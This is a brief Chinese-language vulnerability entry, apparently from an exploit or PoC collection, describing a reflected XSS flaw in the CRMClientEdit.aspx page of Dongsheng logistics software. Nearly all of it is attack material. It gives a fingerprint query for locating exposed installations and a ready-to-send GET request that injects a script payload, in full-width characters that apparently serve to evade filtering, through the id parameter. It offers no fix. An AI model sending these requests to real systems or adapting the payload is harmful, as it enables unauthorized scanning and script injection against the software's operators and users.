# 东胜物流软件CRMClientEdit.aspx存在反射型XSS漏洞

东胜物流软件 ｜ XSS ｜ —
- **指纹**：`body="CompanysAdapter.aspx"`
- **请求**：`GET /CRM/CRMClientEdit.aspx?handle=edit&id=1</ｓｃｒｉｐｔ><ｓｃｒｉｐｔ>ａｌｅｒｔ(xss)</ｓｃｒｉｐｔ> HTTP/1.1`
- **响应特征**：200